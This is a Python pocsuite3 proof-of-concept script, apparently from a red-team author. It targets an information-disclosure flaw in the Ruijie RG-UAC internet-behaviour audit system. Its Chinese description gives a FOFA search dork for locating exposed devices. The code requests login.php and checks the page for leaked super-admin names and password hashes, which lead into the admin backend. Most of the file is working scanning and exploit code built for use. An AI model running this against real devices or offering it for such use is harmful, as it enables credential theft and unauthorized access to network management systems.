#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Author  : RedTeamWing
# @CreateTime: 2021/3/8 下午11:10
# @FileName: ruijie-information-disclosure.py
# @Blog：https://redteamwing.com
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, VUL_TYPE
from pocsuite3.lib.utils import random_str
from urllib.parse import urlparse, urljoin


class DemoPOC(POCBase):
    vulID = '2020-520'  # ssvid
    version = '1.0'
    author = ['Wing&&z3']
    vulDate = '2020-05-20'
    createDate = '2020-05-20'
    updateDate = '3020-05-20'
    references = ['RedTeaming']
    name = 'ruijie-information-disclosure'
    appPowerLink = ''
    appName = '锐捷RG-UAC'
    appVersion = ''
    vulType = VUL_TYPE.Backdoor
    desc = '''
    锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露,可以间接获取用户账号密码信息登录后台
    fofa dork
      title="RG-UAC登录页面" && body="admin"
    '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        ####
        headers = {
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20"
        }

        path = "login.php"

        verify_code = '"role":"super_admin","name":"'
        verify_code2 = '","password":"'

        url = urljoin(self.url, path)

        resp = requests.get(url=url, headers=headers, timeout=8)
        # resp = requests.post(url, data=payload)
        try:
            if verify_code in resp.text and verify_code2 in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Payload'] = "源代码密码泄露,页面搜索admin关键词即可看到密码hash"
        except Exception as ex:
            logger.error(str(ex))

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    _attack = _verify


register_poc(DemoPOC)
